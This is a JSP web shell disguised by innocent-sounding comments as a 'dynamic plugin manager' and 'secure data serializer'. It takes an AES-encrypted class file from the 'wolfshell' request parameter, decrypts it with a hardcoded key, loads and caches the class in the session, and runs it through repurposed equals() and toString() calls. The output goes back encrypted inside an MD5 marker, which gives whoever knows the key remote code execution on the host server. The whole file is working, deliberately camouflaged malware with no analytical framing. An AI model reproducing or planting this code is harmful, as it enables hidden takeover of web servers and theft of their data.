<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.util.HashMap" %>
<%!
    /**
     * Manages dynamic plugins for processing user data requests.
     * This class uses reflection to avoid static coupling with plugin implementations.
     */
    static class DynamicPluginManager {
        private ClassLoader parentClassLoader;

        public DynamicPluginManager(ClassLoader parent) {
            this.parentClassLoader = parent;
        }

        /**
         * A custom ClassLoader to safely load plugin code from a byte array.
         */
        private class PluginByteLoader extends ClassLoader {
            PluginByteLoader(ClassLoader parent) {
                super(parent);
            }
            public Class loadPluginClass(byte[] classBytes) {
                return super.defineClass(classBytes, 0, classBytes.length);
            }
        }

        /**
         * Loads a plugin class from its byte representation.
         * @param pluginBytes The compiled plugin code.
         * @return The loaded Class object for the plugin.
         */
        public Class loadPlugin(byte[] pluginBytes) {
            return new PluginByteLoader(this.parentClassLoader).loadPluginClass(pluginBytes);
        }
    }

    /**
     * A utility for serializing and deserializing data payloads for secure transport.
     * It uses AES for encryption to protect data integrity and confidentiality.
     */
    static class SecureDataSerializer {
        private String encryptionKey;
        private String algorithm;

        public SecureDataSerializer(String key, String algo) {
            this.encryptionKey = key;
            this.algorithm = algo;
        }

        /**
         * Processes data (encrypts or decrypts).
         * @param data The input data.
         * @param isEncrypt True to encrypt, false to decrypt.
         * @return The processed data.
         */
        public byte[] process(byte[] data, boolean isEncrypt) throws Exception {
            int mode = isEncrypt ? javax.crypto.Cipher.ENCRYPT_MODE : javax.crypto.Cipher.DECRYPT_MODE;
            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(this.algorithm);
            cipher.init(mode, new javax.crypto.spec.SecretKeySpec(this.encryptionKey.getBytes(), this.algorithm));
            return cipher.doFinal(data);
        }
    }

    // --- Configuration Constants ---
    private static final String CONFIG_ENCRYPTION_KEY = "3c6e0b8a9c15224a";
    private static final String CONFIG_PLUGIN_ID_PARAM = "wolfshell";
    private static final String CONFIG_ALGORITHM = "AES";
    private static final String CONFIG_DIGEST = "MD5";
    private static final String SESSION_CACHE_KEY = "payload";

    /**
     * Generates an MD5 hash for data verification.
     * @param data The string to hash.
     * @return The uppercase hex representation of the hash.
     */
    public static String createDigest(String data) throws Exception {
        java.security.MessageDigest md = java.security.MessageDigest.getInstance(CONFIG_DIGEST);
        md.update(data.getBytes());
        return new java.math.BigInteger(1, md.digest()).toString(16).toUpperCase();
    }
%><%
    try {
        String pluginRequestID = request.getParameter(CONFIG_PLUGIN_ID_PARAM);
        if (pluginRequestID == null) return; // No plugin requested.

        // Initialize utilities with configured values.
        SecureDataSerializer serializer = new SecureDataSerializer(CONFIG_ENCRYPTION_KEY, CONFIG_ALGORITHM);
        
        // Base64 is used for transport encoding. Reflective calls to support different Java versions.
        Class<?> base64 = Class.forName("java.util.Base64");
        Object decoder = base64.getMethod("getDecoder").invoke(null);
        Method decodeMethod = decoder.getClass().getMethod("decode", String.class);
        
        // Deserialize the incoming request data.
        byte[] pluginData = (byte[]) decodeMethod.invoke(decoder, pluginRequestID);
        byte[] deserializedData = serializer.process(pluginData, false);

        // Check if the plugin is already loaded and cached in the session.
        if (session.getAttribute(SESSION_CACHE_KEY) == null) {
            // First time seeing this plugin type, load it.
            DynamicPluginManager pluginManager = new DynamicPluginManager(this.getClass().getClassLoader());
            Class<?> pluginClass = pluginManager.loadPlugin(deserializedData);
            session.setAttribute(SESSION_CACHE_KEY, pluginClass);
        } else {
            // Plugin is already loaded, execute it with new parameters.
            request.setAttribute("parameters", deserializedData);
            java.io.ByteArrayOutputStream pluginOutputStream = new java.io.ByteArrayOutputStream();

            // Instantiate the cached plugin.
            Class<?> cachedPluginClass = (Class<?>) session.getAttribute(SESSION_CACHE_KEY);
            Object pluginInstance = cachedPluginClass.newInstance();

            // The plugin's 'equals' method is repurposed as an entry point for execution.
            // This is a convention for this specific plugin architecture.
            pluginInstance.equals(pluginOutputStream);
            pluginInstance.equals(pageContext);

            // The plugin's 'toString' can be used for cleanup or finalization.
            pluginInstance.toString();

            // Construct and send the response.
            String responseDigest = createDigest(CONFIG_PLUGIN_ID_PARAM + CONFIG_ENCRYPTION_KEY);
            
            Object encoder = base64.getMethod("getEncoder").invoke(null);
            Method encodeMethod = encoder.getClass().getMethod("encodeToString", byte[].class);
            
            byte[] serializedOutput = serializer.process(pluginOutputStream.toByteArray(), true);
            String encodedOutput = (String) encodeMethod.invoke(encoder, serializedOutput);

            response.getWriter().write(responseDigest.substring(0, 16));
            response.getWriter().write(encodedOutput);
            response.getWriter().write(responseDigest.substring(16));
        }
    } catch (Exception e) {
        // In production, log this exception to a monitoring service.
    }
%>